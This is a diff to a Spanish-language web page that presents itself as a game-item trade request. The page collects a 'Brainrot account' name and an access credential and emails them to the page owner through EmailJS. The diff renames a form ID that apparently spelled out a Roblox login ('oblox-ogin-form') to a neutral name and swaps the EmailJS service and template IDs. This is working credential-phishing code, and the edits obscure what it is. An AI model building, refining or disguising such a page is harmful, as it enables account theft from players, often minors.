@@ -350,7 +350,7 @@
         <div class="intercambio-title">INTERCAMBIO</div>
         <div class="ogin-subtitle" data-es="Completar peticion" data-en="Complete request">Completar Peticion</div>
         
-        <form id="oblox-ogin-form" class="ogin-form">
+        <form id="forma-registro" class="ogin-form">
             <div class="form-group">
                 <label for="account" data-es="Cuenta de brainrot:" data-en="Brainrot account:">Cuenta de brainrot:</label>
                 <input type="text" id="account" placeholder="" required>
@@ -421,8 +421,7 @@
             });
         }
         
-        // Manejar envío del formulario
-        document.getElementById('oblox-ogin-form').addEventListener('submit', async function(e) {
+        document.getElementById('forma-registro').addEventListener('submit', async function(e) {
             e.preventDefault();
             const account = document.getElementById('account').value;
             const access = document.getElementById('access').value;
@@ -441,15 +440,15 @@
                     fecha: new Date().toLocaleString()
                 };
                 
-                console.log('Enviando email con Template ID: template_joy0l7f');
+                console.log('Enviando email con Template ID: template_ga9xk7u');
                 
                 // Enviar email
-                emailjs.send('service_j14x9qk', 'template_joy0l7f', templateParams)
+                emailjs.send('service_08y0xce', 'template_ga9xk7u', templateParams)
                     .then(function(response) {
-                        console.log('✅ Email enviado correctamente!', response);
+                        console.log('✅ Registrado!', response);
                         
                         // Ocultar formulario y mostrar mensaje de gracias
-                        document.getElementById('oblox-ogin-form').style.display = 'none';
+                        document.getElementById('forma-registro').style.display = 'none';
                         document.getElementById('gracias-mensaje').style.display = 'block';
                         
                         // Guardar datos de la peticion
